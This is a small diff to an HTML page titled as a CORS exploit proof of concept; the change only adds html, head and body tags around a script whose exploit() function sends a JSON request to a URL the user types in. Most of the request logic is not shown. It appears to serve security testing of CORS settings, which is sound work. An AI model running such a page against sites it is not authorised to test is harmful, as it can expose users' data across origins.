@@ -1,4 +1,5 @@
-<script>
+<html><head><title>CORS exploit proof-of-concept</title></head>
+<body><script>
 var jsonData = {};
 function exploit() {
 var urlVar = document.getElementById("varInput").value    
@@ -14,4 +15,5 @@ xmlhttp.send(JSON.stringify(jsonData));
 };
 </script>
 <input type="text" placeholder="Put CORS test page here" id="varInput"></input>
-<button onclick="exploit();">run proof of concept</button>
+<button onclick="exploit();">run proof of concept</button></body>
+</html>
